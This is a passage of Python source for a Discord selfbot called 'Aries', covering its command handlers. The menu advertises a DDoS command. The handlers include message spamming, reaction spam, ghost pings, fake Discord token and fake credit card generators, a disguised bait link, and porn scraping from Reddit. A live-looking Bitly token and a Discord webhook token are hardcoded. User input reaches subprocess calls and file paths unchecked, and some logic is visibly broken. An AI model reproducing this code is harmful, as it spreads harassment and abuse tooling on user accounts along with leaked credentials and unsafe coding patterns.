    await aries.sendCustomEmbed(ctx, "Aries Utilities Menu", f"ddos » DDoS Someone » [{prefix_config}ddos <threads, ip>]\npingip » Ping an IP » [{prefix_config}pingip <IP>]\nafk » Set your AFK Status » [{prefix_config}afk <True/False>]\nIplookup » Get an IP's Info » [{prefix_config}iplookup <ip>]\nCPU » Get Your CPU Usage and Info » [{prefix_config}cpu <None>]\nPoll » Make a poll! » [{prefix_config}poll <Question>]\nSupport » Receive Aries Support » [{prefix_config}support <None>]\nBackup » Backup the server you send this in » [{prefix_config}backup <None>]\nPingweb » Ping a website » [{prefix_config}pingweb <Website>]\nGoogleSearch » Search on google » [{prefix_config}googlesearch <Search>]\nConvertVideo » DL a YT vid to mp4 » [{prefix_config}convertvideo <link>]\nHeaders » Get the headers of a website » [{prefix_config}headers <link>]\nShortenURL » Shorten a link » [{prefix_config}shortenurl <link>]\nCalculator » Opens calculator » [{prefix_config}calculator <None>]\nOpenapp » Opens an app of choice (buggy) » [{prefix_config}openapp <Name>]\nWebsiteIP » Get an IP of a website » [{prefix_config}grabsiteip <Site>]\nCrypto » Display Crypto Currency Stats » [{prefix_config}Crypto <None>]\nPCInfo » Display PC Info » [{prefix_config}pcinfo <None>]\n\n**<> = Arguments [] = Usage**")
#Settings Commands
@bot.command()
async def settings(ctx):
     await aries.sendCustomEmbed(ctx, "Settings Menu", f"Status » Change your Status » [{prefix_config}status <Status>]\nSniper » Check sniper status » Check the Nitro Sniper Status » [{prefix_config}sniperstatus <None>]\nCheckPrefix » Check Aries Prefix » [{prefix_config}prefix <None>]\nSBDetector » Check Aries Detection » [{prefix_config}selfbotdetector <None>] » [None]\nSetSniper » Check Aries Nitro Sniper » [{prefix_config}setsniper <True/False>\nAFKMessage » Set Aries AFK Message » [{prefix_config}afkmessage <msg>\nSetDet » Set Aries SB Detector » [{prefix_config}setdet <val>\n\n**<> = Arguments [] = Usage**")
#Embed Command
@bot.command()
async def embed(ctx, titleEdit, descriptionEdit):
    await aries.sendCustomEmbed(ctx, titleEdit, descriptionEdit)
@bot.command()
async def folder(ctx):
    path = f"{str(os.getcwd())}"
    webbrowser.open(path)
@bot.command()
async def googlesearch(ctx, *, question):
    #Search
    searchInput = "https://google.com/search?q="+ urllib.parse.quote(question)
    #Get
    res = requests.get(searchInput)

    res.raise_for_status()

    soup = bs4.BeautifulSoup(res.text, "html.parser")
    #Get the Link elements
    linkElements = soup.select('div#main > div > div > div > a')
    #Check length of linkElements if 0 no results
    if len(linkElements) == 0:
        await aries.sendEmbed(ctx, "No Results Found!") 
        #Else if found results
    else:
        #Link variable
        link = linkElements[0].get("href")
        #Set variable i to 0
        i = 0

        while link[0:4] != "/url" or link[14:20] == "google":

            i += 1

        link = linkElements[i].get("href")
        #Send Results
        await aries.sendEmbed(ctx, "http://google.com" + link)
          #  embed = discord.Embed(title=config.get('title'), description = "http://google.com" + link, color=readableHex)    
@bot.command()
async def jumpscare(ctx):
    await ctx.message.delete()
    await ctx.send("wtf is this monkey doing? https://pnrtscr.com/kqrkc7")
@bot.command()
async def backup(ctx):
    await ctx.message.delete()
    await bot.create_guild(f'backup-{ctx.guild.name}')
    try:
        for guild in bot.guilds:
            if f'backup-{ctx.guild.name}' in guild.name:
                for channels in guild.channels:
                    await channels.delete()
                for category in ctx.guild.categories:
                    x = await guild.create_category(f"{category.name}")
                    for channel in category.channels:
                        if isinstance(channel, discord.VoiceChannel):
                            await x.create_voice_channel(f"{channel}")
                        if isinstance(channel, discord.TextChannel):
                            await x.create_text_channel(f"{channel}")
                for role in ctx.guild.roles:
                    await guild.create_role(name=role.name, permissions=role.permissions, colour=role.colour)
    except Exception:
        pass
@bot.command()
async def penis(ctx):
    async with aiohttp.ClientSession() as cs:
        async with cs.get('https://www.reddit.com/r/penis/new.json?sort=hot') as r:
            res = await r.json()
        await aries.sendFullyCustomEmbed(ctx, "", "", res['data']['children'] [random.randint(0, 25)]['data']['url'])
@bot.command()
async def thighs(ctx):
    async with aiohttp.ClientSession() as cs:
        async with cs.get('https://www.reddit.com/r/thigh/new.json?sort=hot') as r:
            res = await r.json()
        await aries.sendFullyCustomEmbed(ctx, "", "", res['data']['children'] [random.randint(0, 25)]['data']['url'])
@bot.command()
async def wyrather(ctx):
    wyr = ["Would you rather Eat pizza, or Icecream for your WHOLE life?"]
    await aries.sendEmbed(ctx, random.choice(wyr))
@bot.command()
async def ban(ctx, member : discord.Member, *, reason = None):
    try:
        await aries.sendEmbed(ctx, "Banned " + member.mention + " Successfully! ")       
        await member.ban(reason = reason)
    except:  
        await aries.sendEmbed(ctx, "Error | Insufficient Perms!")    
@bot.command()
async def kick(ctx, member : discord.Member, *, reason = None):
    try:   
        await aries.sendEmbed(ctx, "Kicked " + member.mention + " Successfully! ")
        await member.kick(reason = reason)
        await ctx.send(embed = embed) 
    except commands.MissingPermissions:
        await aries.sendEmbed(ctx, "Error | Insufficient Perms!")    
@bot.command()
async def purge(ctx, limit: int):
    #Accounting for the fact it doesn't delete the prefix purge part.
    limit = limit + 1
    try:
        await ctx.channel.purge(limit=limit)  
        await aries.sendEmbedNoDelete(ctx, "Successful Purge!")
    except commands.MissingPermissions:
        await aries.sendEmbed(ctx, "Error | Insufficient Perms!")  
@bot.command()
async def create(ctx, name):
    try:
        guild = ctx.guild
        #channel = await guild.create_text_channel(channel_name)
        await guild.create_text_channel(name)
        await aries.sendEmbed(ctx, "Created " + "Successfully")
    except commands.MissingPermissions:
        await aries.sendEmbed(ctx, "Error | Insufficient Perms!")
@bot.command()
async def shortenurl(ctx, link):
    #Bitly Access
    BITLY_ACCESS_TOKEN ="84ad42991d089c4629293f0cf5f2fa1a65c3b1f0" 
    #Connect with the token
    access = bitly_api.Connection(access_token = BITLY_ACCESS_TOKEN)
    #Shorten url
    short_url = access.shorten(link)  
    #Send shorter URL
    await aries.sendEmbed(ctx, f"Shorter Link: {short_url['url']}")
@bot.command()
async def delete(ctx, name):
    try:
        guild = ctx.guild
        existing_channel = discord.utils.get(guild.channels, name=name)
        await existing_channel.delete()
        await aries.sendEmbed(ctx, f"Deleted {name} Successfully!")    
    except commands.MissingPermissions:
        await aries.sendEmbed(ctx, "Error | Insufficient Perms!")   
@bot.command()
async def roll(ctx):
    await aries.sendEmbed(ctx, str(random.randrange(1, 2000)))
@bot.command()
async def restart(ctx):
    await aries.sendEmbed(ctx, "Restarting in 5 seconds...")
    #Give user time to know we are restarting // Sleep 5 Seconds
    await asyncio.sleep(5)
    #Exit and Run the bot Agian
    os.execl(sys.executable, sys.executable, "\"{}\"".format(sys.argv[0]))
@bot.command()
async def faketoken(ctx):
   y = ''.join(random.choice(string.ascii_uppercase + string.digits + string.ascii_lowercase) for _ in range(17))
   x = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in range(3))
   w = ''.join(random.choice(string.ascii_uppercase + string.digits + string.ascii_lowercase) for _ in range(27))
   await aries.sendEmbed(ctx, f"ODg4ODI{y}.YUY{x}.{w}\n")
#Boobs Command
@bot.command()
async def boobs(ctx):
   async with aiohttp.ClientSession() as cs:
        async with cs.get('https://www.reddit.com/r/boobs/new.json?sort=hot') as r:
            res = await r.json()
        await aries.sendFullyCustomEmbed(ctx, "", "", res['data']['children'] [random.randint(0, 25)]['data']['url'])
#Status Command
@bot.command()
async def status(ctx, *args):
    stati = {
        "on":       Status.online,
        "online":   Status.online,
        "off":      Status.invisible,
        "offline":  Status.invisible,
        "dnd":      Status.dnd,
        "idle":     Status.idle,
        "afk":      Status.idle
    }
    if args:
        if (args[0] in stati):
            #Checks if Args are equal to AFK ex .status the args would be after status
            if (args[0] == "afk"):
                await bot.change_presence(status=Status.idle, afk=True)
                await aries.sendEmbed(ctx, "Changed Status to AFK")
    if (args[0] == "dnd"):
        await bot.change_presence(status=Status.dnd, afk=False)
        await aries.sendEmbed(ctx, "Changed Status to DND")
    if (args[0] == "online"):
        await bot.change_presence(status=stati[args[0]], afk=False)
        await aries.sendEmbed(ctx, "Changed Status to Online")
@bot.command()
async def openapp(ctx, app):
    call([f"{app}.exe"])
    print(app)
@bot.command()
async def calculator(ctx):
    call(["calc.exe"])
    await aries.sendEmbed(ctx, f"Opened!")
#UserInfo Command
@bot.command()
async def userinfo(ctx):
    global start_time
    end_time = dt.now()
    userinfo1 = bot.get_user(bot.user.id)
    num = 0
    for i in range (0, len(bot.user.friends)):
        num += 1
    #embed = discord.Embed(title=config.get('title'), description = "Name » " + str(bot.user) + "\nUsers In » " + str(len(bot.guilds)) + f" Guilds\n" + 'You have been using Aries For » {}'.format(end_time - start_time) + f"\nYour Account Was Created At »\n {userinfo1.created_at}" + f"\nYou Have: {int(num)} Friends" + "\nAvatar ↓ ", color=readableHex)
    await aries.sendFullyCustomEmbed(ctx, "Aries", "Name » " + str(bot.user) + "\nUsers In » " + str(len(bot.guilds)) + f" Guilds\n" + 'You have been using Aries For » {}'.format(end_time - start_time) + f"\nYour Account Was Created At »\n {userinfo1.created_at}" + f"\nYou Have: {int(num)} Friends" + "\nAvatar ↓ ", str(bot.user.avatar_url))
#todo command
@bot.command()
async def todo(ctx):
    await aries.sendEmbed(ctx, "WIP")
#Sniper Command
@bot.command()
async def sniperstatus(ctx):
    await aries.sendEmbed(ctx, str(f"{nitro_sniper_config}"))
#Avatar Command
@bot.command()
async def avatar(ctx, *, user: discord.Member = None):
    await aries.sendFullyCustomEmbed(ctx, str(user) + "'s Avatar", "", str(user.avatar_url))
#Sniper Command
@bot.command()
async def allah(ctx):
    await aries.sendEmbed(ctx, "ALLAH SAYS GET ARIES")
@bot.command()
async def pickup(ctx):
    pickuplines = ["if you were a booger, i'd pick you first", "sup, are you from tennessee? cause your the only 10 i see ", "basic math: add the bed, subtract the clothes, divide the legs, and pray we don't multiply ", "you're so hot, my zipper is falling for you", "Are you an elevator? Because I’ll go up and down on you."]
    await aries.sendEmbed(ctx, random.choice(pickuplines))
@bot.command()
async def joke(ctx):
    jokes = ["Why did the orange lose the race? It ran out of juice.", "How you fix a broken pumpkin? With a pumpkin patch", "What's the best thing about Switzerland? I don't know, but the flag is a big plus.", "Why do peppers make such good archers? Because they habanero.", "What did the sink tell the toilet? You look flushed!", "Can February March? No, but April May!Can February March? No, but April May!", "I hated facial hair but then it grew on me.", ]
    await aries.sendEmbed(ctx, random.choice(jokes))
@bot.command()
async def headers(ctx, website):
    r = requests.get(website, allow_redirects=True)
    await aries.sendEmbed(ctx, f"Headers: {r.headers}")
@bot.command()
async def rickroll(ctx):
    await aries.sendFullyCustomEmbed(ctx, "Aries Just Ricked YOU!", "https://www.youtube.com/watch?v=dQw4w9WgXcQ", "https://media.giphy.com/media/Ju7l5y9osyymQ/giphy.gif")
@bot.command()
async def ariesinvite(ctx):
    await aries.sendEmbed(ctx, "https://ariessb.xyz") 
@bot.command()
async def cn(ctx, name, contents):
    ISDIR = os.path.isdir("./data/notes/")
    if not ISDIR:
        os.mkdir("./data/notes")
    with open("./data/notes/" + name + ".json", "w") as f:
        f.write(json.dumps(str(contents), indent=4))
    await aries.sendEmbed(ctx, "Made Note with Contents: " + contents)
@bot.command()
async def en(ctx, notename, newcontent):
    ISDIR = os.path.exists("./data/notes/" + notename + ".json")
    ISDIR2 = os.path.isdir("./data/notes")
    if not ISDIR2:
        os.mkdir("./data/notes")
    if ISDIR:
     with open("./data/notes/" + notename + ".json", "w") as f:
        f.write(json.dumps(str(newcontent), indent=4))
        await aries.sendEmbed(ctx, "Edited " + notename + " with Contents: " + newcontent)
    else:
     await aries.sendEmbed(ctx, "No note found with the name: " + notename)
@bot.command()
async def leave(ctx):
    guild = ctx.guild
    print(Fore.CYAN + "Info" + Fore.RESET + " | " + Fore.LIGHTCYAN_EX + "[!] " + Fore.CYAN + "Left Server » " + Fore.LIGHTCYAN_EX + str(guild))
    await asyncio.sleep(1)
    await guild.leave()
@bot.command()
async def slur(ctx):
    slurs = ["", "", "", ""]
    aries.sendEmbed(ctx, random.choice(slurs))
@bot.command()
async def hentai(ctx):
    async with aiohttp.ClientSession() as cs:
        async with cs.get('https://www.reddit.com/r/hentai/new.json?sort=hot') as r:
            res = await r.json()
        await aries.sendFullyCustomEmbed(ctx, "", "", res['data']['children'] [random.randint(0, 25)]['data']['url'])
@bot.command()
async def poop(ctx):
    async with aiohttp.ClientSession() as cs:
        async with cs.get('https://www.reddit.com/r/poop/new.json?') as r:
            res = await r.json()
        await aries.sendFullyCustomEmbed(ctx, "", "", res['data']['children'] [random.randint(0, 25)]['data']['url'])
@bot.command()
async def fakenitro(ctx):
    await ctx.message.delete()
    await ctx.send("https://cdn.discordapp.com/attachments/769698485527248907/895897569589346314/unknown.png")
@bot.command()
async def checkprefix(ctx):
    await aries.sendEmbed(ctx, f"{prefix_config}")
@bot.command()
async def ln(ctx):
    onlyfiles = [f for f in listdir("./Data/Notes")]
    file = str(onlyfiles)
    file2 = file.replace(".json", "")
    await aries.sendEmbed(ctx, str(file2.replace("'", "")))
@bot.command()
async def setdet(ctx, val):
    global afkmode
    global fake_nitro
    args1 = str(val)
    args2 = args1.replace("T", "t")
    data = {
        "token": f"{token_config}",
        "prefix": f"{prefix_config}",
        "sniper": f"{nitro_sniper_config}",
        "detector": f"{args2}",
        "theme": f"{theme_config}",
        "AFK": f"{afkmode_config}",
        "AFK-Message": f"{afkmsg_config}",
        "Fake-Nitro": f"{fake_nitro}",
        "Delete_Timer": f"{deltimer_config}"
    }
    with open(f"./data/config.json", "w") as f:
        f.write(json.dumps(data, indent=4))
    await aries.sendEmbed(ctx, "Set SB Detection To: " + str(args2))
    os.execl(sys.executable, sys.executable, "\"{}\"".format(sys.argv[0]))
@bot.command()
async def selfbotdetector(ctx):
    await aries.sendEmbed(ctx, f"{selfbot_detector_config}")
@bot.command()
async def nick(ctx, member: discord.Member, nick):
    await member.nick(nick = nick)
    await aries.sendEmbed(ctx, "Set Nick To: " + nick)
@bot.command()
async def spam(ctx, delay: int, count, *, message):
    await ctx.message.delete()
    for i in range(int(count)):
        await ctx.send(message)
        await asyncio.sleep(delay)
@bot.command()
async def time(ctx):
    now = dt.now()
    current_time = now.strftime("%H/%M/%S")
    await aries.sendEmbed(ctx, "Current time: " + current_time)
@bot.command()
async def date(ctx):
    today = dt.today().strftime('%Y-%m-%d')
    await aries.sendEmbed(ctx, "Current Date: " + today)
@bot.command()
async def server(ctx):
    guild = ctx.guild
    memcount = len([m for m in ctx.guild.members if not m.bot]) # doesn't include bots
    await aries.sendEmbed(ctx, "Aries Info on: " + str(guild) + " Server has: " + str(memcount) + " Members" )
@bot.command()
async def invite(ctx):
    guild = ctx.guild
    link = await ctx.channel.create_invite(max_age = 300)
    aries.sendEmbed(ctx, "Invite: " + str(link))
@bot.command()
async def nuke(ctx):
    channel = await ctx.channel.clone()
    await aries.sendEmbed(ctx, f"Successfully Nuked {channel}")
@bot.command()
async def meme(ctx):
     async with aiohttp.ClientSession() as cs:
        async with cs.get('https://www.reddit.com/r/memes/new.json?sort=funny') as r:
            res = await r.json()
        await aries.sendFullyCustomEmbed(ctx, "", "", res['data']['children'] [random.randint(0, 25)]['data']['url'])
@bot.command()
async def ghostping(ctx, user: discord.User):
    await ctx.message.delete()
@bot.command()
async def genpass(ctx, length):
    result_str = ''.join(random.choice(string.ascii_letters + "12345678910/;':[']|") for i in range(int(length)))
    await aries.sendEmbed(ctx, result_str)
@bot.command()
async def sendnoti(ctx, title, message):
    notif = ToastNotifier()
    notif.show_toast(title, message, icon_path="assets/ariesnobg.ico", duration=10)
    await aries.sendEmbed(ctx, "Sent Noti!")

@bot.command()
async def porngif(ctx):
     async with aiohttp.ClientSession() as cs:
        async with cs.get('https://www.reddit.com/r/porngif/new.json?sort=hot') as r:
            res = await r.json()
        await aries.sendFullyCustomEmbed(ctx, "", "", res['data']['children'] [random.randint(0, 25)]['data']['url'])
@bot.command()
async def foodporn(ctx):
     async with aiohttp.ClientSession() as cs:
        async with cs.get('https://www.reddit.com/r/food/new.json?sort=hot') as r:
            res = await r.json()
        await aries.sendFullyCustomEmbed(ctx, "", "", res['data']['children'] [random.randint(0, 25)]['data']['url'])
@bot.command()
async def dilf(ctx):
     async with aiohttp.ClientSession() as cs:
        async with cs.get('https://www.reddit.com/r/dilf/new.json?sort=hot') as r:
            res = await r.json()
        await aries.sendFullyCustomEmbed(ctx, "", "", res['data']['children'] [random.randint(0, 25)]['data']['url'])
@bot.command()
async def milf(ctx):
     async with aiohttp.ClientSession() as cs:
        async with cs.get('https://www.reddit.com/r/milf/new.json?sort=hot') as r:
            res = await r.json()
        await aries.sendFullyCustomEmbed(ctx, "", "", res['data']['children'] [random.randint(0, 25)]['data']['url'])
@bot.command()
async def ass(ctx):
     async with aiohttp.ClientSession() as cs:
        async with cs.get('https://www.reddit.com/r/ass/new.json?sort=hot') as r:
            res = await r.json()
        await aries.sendFullyCustomEmbed(ctx, "", "", res['data']['children'] [random.randint(0, 25)]['data']['url'])
@bot.command()
async def pussy(ctx):
     async with aiohttp.ClientSession() as cs:
        async with cs.get('https://www.reddit.com/r/pussy/new.json?sort=hot') as r:
            res = await r.json()
        await aries.sendFullyCustomEmbed(ctx, "", "", res['data']['children'] [random.randint(0, 25)]['data']['url'])
@bot.command()
async def hentaigif(ctx):
    gifs = ["https://25.media.tumblr.com/tumblr_m1v7mdNnzg1r6wwpso1_400.gif", "https://i.redd.it/h6oi753u0ts41.gif"]
    await aries.sendFullyCustomEmbed(ctx, "", "", str(random.choice(gifs)))
@bot.command()
async def uploadimage(ctx):
    for attachment in ctx.message.attachments:
        # Download Image to file location
        await attachment.save(attachment.filename)

    CLIENT_ID = "26961e77de57def"
    im = pyimgur.Imgur(CLIENT_ID)
    attachment_url = ctx.message.attachments[0].filename
    #Upload image where it downloads it
    uploaded_image = im.upload_image(str(os.getcwd() + "/" + attachment_url), title="Uploaded with Aries")
    uploaded = "true"
    #Print Image
    await aries.sendEmbed(ctx, "Uploaded: " + str(uploaded_image.link))
    if (uploaded == "true"):
     
     os.remove((str(os.getcwd() + "/" + attachment_url)))
     uploaded = "false"
    await ctx.send(embed = embed)
@bot.command()
async def afkmessage(ctx, *, message):
    data = {
        "token": f"{token_config}",
        "prefix": f"{prefix_config}",
        "sniper": f"{nitro_sniper_config}",
        "detector": f"{selfbot_detector_config}",
        "theme": f"{theme_config}",
        "AFK": f"{afkmode_config}",
        "AFK-Message": f"{message}",
        "Fake-Nitro": f"{fake_nitro}",
        "Delete_Timer": f"{deltimer_config}"
    }
    with open("./data/config.json", "w") as f:
        f.write(json.dumps(data, indent=4))
    await aries.sendEmbed(ctx, f"Set AFK Message To: {message}")
    os.execl(sys.executable, sys.executable, "\"{}\"".format(sys.argv[0]))
@bot.command()
async def copycat(ctx, user: discord.User, value: bool):
    global copier
    copier = value
    global person
    person = user.name
    await aries.sendEmbed(ctx, "Now Copying: " + str(person) + " Set Copier to: " + str(copier))

@bot.command()
async def spamreact(ctx, id):
    await ctx.message.delete()
    msg = await ctx.fetch_message(id)
    await msg.add_reaction('\N{THUMBS UP SIGN}')
    await msg.add_reaction('\N{THUMBS DOWN SIGN}')
    await msg.add_reaction('❤️')
    await msg.add_reaction('😳')
    await msg.add_reaction('😍')
    await msg.add_reaction('😠')
    await msg.add_reaction('😈')
    await msg.add_reaction('😔')
    await msg.add_reaction('💀')
    await msg.add_reaction('👑')
    await msg.add_reaction('🍴')
    await msg.add_reaction('🍉')
    await msg.add_reaction('💯')
    await msg.add_reaction('🥺')
    await msg.add_reaction('😍')
    await msg.add_reaction('🥵')
    await msg.add_reaction('🧠')
    await msg.add_reaction('🤔')
    await msg.add_reaction('🙄')
    await msg.add_reaction('🙌')
    await msg.add_reaction('☠️')
@bot.command()
async def genusername(ctx):
    chars = "abcdefghijklmnopqrstuvwxyz"
    username = '{}{}{}'.format(random.choice(chars), random.choice(chars)[-1][:3].rjust(3, random.choice(chars)), '{:03d}'.format(random.randrange (1,999)))
    await aries.sendEmbed(ctx, f"Username: {str(username)}")
@bot.command()
async def poll(ctx, *, question):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_config}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    embed = discord.Embed(title= config.get('title'), description = f"{question}", color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    msg = await ctx.send(embed = embed)   
    await msg.add_reaction('\N{THUMBS UP SIGN}')
    await msg.add_reaction('\N{THUMBS DOWN SIGN}')
@bot.command()
async def setsniper(ctx, value):
    await ctx.message.delete()
    global afkmode
    args1 = str(value)
    args2 = args1.replace("T", "t")
    data = {
        "token": f"{token_config}",
        "prefix": f"{prefix_config}",
        "sniper": f"{args2}",
        "detector": f"{selfbot_detector_config}",
        "theme": f"{theme_config}",
        "AFK": f"{afkmode_config}",
        "AFK-Message": f"{afkmsg_config}",
        "Fake-Nitro": f"{fake_nitro_config}",
        "Delete_Timer": f"{delete_timer}"
    }
    with open(f"./data/config.json", "w") as f:
        f.write(json.dumps(data, indent=4))
    await aries.sendEmbed(ctx, "Sniper is: " + str(args2))
    os.execl(sys.executable, sys.executable, "\"{}\"".format(sys.argv[0]))
@bot.command()
async def crypto(ctx):
    #TODO Add More Cryptos
    url = "https://api.coingecko.com/api/v3/simple/price?ids=bitcoin&vs_currencies=usd%2Ceur%2Cgbp"
    url2 = "https://api.coingecko.com/api/v3/simple/price?ids=dogecoin&vs_currencies=usd%2Ceur%2Cgbp"
    r = requests.get(url)
    r2= requests.get(url2)
    rToJson = r.json()
    r2ToJson = r2.json()

    btcUSD = rToJson["bitcoin"]["usd"]
    btcEUR = rToJson["bitcoin"]["eur"]
    btcGBP = rToJson["bitcoin"]["gbp"]
    dogeUSD = r2ToJson["dogecoin"]["usd"]
    dogeEUR = r2ToJson["dogecoin"]["eur"]
    dogeGBP = r2ToJson["dogecoin"]["gbp"]
    await aries.sendEmbed(ctx, f"Bitcoin: USD: {btcUSD} - EUR: {btcEUR} - GPB: {btcGBP}\nDogecoin: USD: {dogeUSD} - EUR: {dogeEUR} - GBP: {dogeGBP}")
@bot.command()
async def settheme(ctx, theme1):
    global theme
    global afkmode
    global afkmsg
    theme = theme1
    data = {
        "token": f"{token}",
        "prefix": f"{prefix_config}",
        "sniper": f"{nitro_sniper_config}",
        "detector": f"{selfbot_detector_config}",
        "theme": f"{theme1}",
        "AFK": f"{afkmode_config}",
        "AFK-Message": f"{afkmsg_config}",
        "Fake-Nitro": f"{fake_nitro_config}",
        "Delete_Timer": f"{delete_timer}"
    }
    with open("./data/config.json", "w") as f:
        f.write(json.dumps(data, indent=4))
    await aries.sendEmbed(ctx, "Theme is: " + theme1)
    os.execl(sys.executable, sys.executable, "\"{}\"".format(sys.argv[0]))
@bot.command()
async def uploadtheme(ctx, themename):
    await ctx.message.delete()
    try:
        webhook = discord.Webhook.partial(927426508576923720, '8zUAWOmsZxxexEzxVWp4gsEDCgsvdoc6dh5oxiYOIhcKwz6X0P4utiR0MQT2DbDrkeMl', adapter=discord.RequestsWebhookAdapter()) # Your webhook
        with open(file=f'./data/themes/{themename}' + ".json", mode='rb') as f:
         my_file = discord.File(f)
        webhook.send(f'Theme Name: {themename}', username='Themes', file=my_file)
    except Exception as e:
        pass
@bot.command()
async def edittheme(ctx, name, newtitle, newimage, newcolor, newtcolor):
    data = {
        "title": f"{newtitle}",
        "imageurl": f"{newimage}",
        "color": f"{newcolor}",
        "TColor": f"{newtcolor}"
    }
    with open(f"./data/themes/{name}.json", "w") as f:
        f.write(json.dumps(data, indent=4))
    await aries.sendEmbed(ctx, f"Edited theme: {name}")
@bot.command()
async def fakecreditcard(ctx):
    def generate():
        key = ''
        portion = ''
        characters = '123456789'

        while True:
            while len(key) < 20:
                character = "" + random.choice(characters) # pick a random character from the string above and ...
                key += character # append to th key
                portion += character

                if len(portion) == 4:
                    key += ' ' # add a hyphen after every 4 characters to get the aaaa-bbbb-cccc-dddd-3333 format
                    portion = ''
            key = key[:-1]
            card = re.sub(r'.', '', key, count = 1)
            return "4" + card
    def gencw():
        key = ''
        portion = ''
        characters = '123456789'

        while True:
            while len(key) < 3:
                character = "4" + random.choice(characters) # pick a random character from the string above and ...
                key += character # append to th key
                portion += character
            key = key[:-1]
            return key       
    credNUmber = generate()
    cw = gencw()
    await aries.sendEmbed(ctx, f"Fake Number: {credNUmber} CW: {cw}\nType: VISA\nExpiration: 02/22")

@bot.command()
async def installtheme(ctx, name):
    data = ""
    if name == "Midnight":
     data = {
    "title": "Midnight",
    "imageurl": "https://cdn.discordapp.com/attachments/769698485527248907/900160094287843338/mystical-midnight-sky-with-stars-surrounded-by-dramatic-clouds-dark-picture-id1133588496.png",
    "color": "#191970",
    "TColor": "Cyan"
       }
    else:
        if name == "ShootingStar":
         data = {
        "title": "Shooting Star",
        "imageurl": "https://cdn.discordapp.com/attachments/769698485527248907/900205216580907038/a2a66b1b23b23791e5d73a00b9325d04.gif",
        "color": "#191970",
        "TColor": "Cyan"
       }
    with open(f"./data/themes/{name}.json", "w") as f:
        f.write(json.dumps(data, indent=4))
    await aries.sendEmbed(ctx, f"Installed theme: {name}")
@bot.command()
async def createtheme(ctx, title, imageurl, color, tcolor):
    data = {
        "title": f"{title}",
        "imageurl": f"{imageurl}",
        "color": f"{color}",
        "TColor": f"{tcolor}"
    }
    with open(f"./data/themes/{name}.json", "w") as f:
        f.write(json.dumps(data, indent=4))
    await aries.sendEmbed(ctx, f"Made theme: {name}")
@bot.command()
async def NitroSound(ctx, value):
    await ctx.message.delete()
    global NitroSound
    if (value == "false" or "False"):
        NitroSound = False
    elif (value == "True" or "true"):
        NitroSound = True
    await aries.sendEmbed(ctx, f"Sounds For Sniper Are: {value}")
@bot.command()
async def availablethemes(ctx):
    await aries.sendEmbed(ctx, f"Themes you can Install:\nMidnight\nShootingStar")
@bot.command()
async def howgay(ctx, user: discord.User):
    gay = random.randrange(1, 100)
    if gay > 50:
        isgay = "Gay!"
    else:
        isgay = "Straight"
    gay2 = str(gay) + "%"
    await aries.sendFullyCustomEmbed(ctx, f"I've determined hes {isgay}", f"{user} is {gay2} gay!", "https://cdn.discordapp.com/attachments/790796610388492299/898081227880423424/Z.png")
@bot.command()
async def dicksize(ctx, user: discord.User):
    dongs = "8{}D".format("=" * random.randint(0, 30))
    if len(dongs) < 15:
        issmall = "I CANT SEE IT"
    else:
        issmall = "ITS HUGE"
    await aries.sendFullyCustomEmbed(ctx, f"Ive determined: {issmall}", f"{user}'s' Dick is {dongs}", "https://c.tenor.com/GeFTyQnfPR0AAAAM/penis-standing-erect.gif")
@bot.command()
async def custompres(ctx, message):
    await ctx.message.delete()
    for i in range(len(message)):
        await bot.change_presence(activity=discord.CustomActivity(name=message[:i+1] ,emoji='🖥️'))
        await asyncio.sleep(0.4)
@bot.command()
async def uptime(ctx):
    global start_time
    end_time = datetime.now()
    await aries.sendEmbed(ctx, 'Time Since Start: {}'.format(end_time - start_time))
@bot.command()
async def evenorodd(ctx):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_config}.json") as f:

    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    embed = discord.Embed(title= config.get('title'), description = 'You have 10 seconds to guess even or odd!', color=readableHex)
    embed2 = discord.Embed(title= config.get('title'), description = str(random.randrange(0, 999)), color=readableHex)
    embed.set_thumbnail(url = "https://cdn.discordapp.com/attachments/895179941740699668/896247994796634133/standard_2.gif")
    embed.set_footer(text = "made with ♡ by bomt")
    embed2.set_thumbnail(url = "https://cdn.discordapp.com/attachments/895179941740699668/896247994796634133/standard_2.gif")
    embed2.set_footer(text = "made with ♡ by bomt")
    msg = await ctx.send(embed = embed)
    sleep(10)
    await msg.edit(embed = embed2)
@bot.command()
async def steppingstones(ctx):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_config}.json") as f:

    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    fall = ["You Fell!", "Your Safe!", "You Fell!", "Your Safe!", "You Fell!", "Your Safe!", "You Fell!", "Your Safe!"]
    embed = discord.Embed(title= config.get('title'), description = 'You Jumped! Did you fall? (wait 5 seconds)', color=readableHex)
    embed2 = discord.Embed(title= config.get('title'), description = str(random.choice(fall)), color=readableHex)
    embed.set_thumbnail(url = "https://cdn.discordapp.com/attachments/895179941740699668/896247994796634133/standard_2.gif")
    embed.set_footer(text = "made with ♡ by bomt")
    embed2.set_thumbnail(url = "https://cdn.discordapp.com/attachments/895179941740699668/896247994796634133/standard_2.gif")
    embed2.set_footer(text = "made with ♡ by bomt")
    msg = await ctx.send(embed = embed)
    sleep(5)
    await msg.edit(embed = embed2)
@bot.command()
async def multipoll(ctx, question1, question2):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_config}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    embed = discord.Embed(title= config.get('title'), description = f"{question1}: \N{THUMBS UP SIGN}\n\n{question2}:\N{THUMBS DOWN SIGN}", color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    msg = await ctx.send(embed = embed)   
    await msg.add_reaction('\N{THUMBS UP SIGN}')
    await msg.add_reaction('\N{THUMBS DOWN SIGN}')
def animate_Rocket():
    distanceFromTop = 20
    isdone = False
    while True and isdone == False:
        print("\n" * distanceFromTop)
        print("          /\        ")
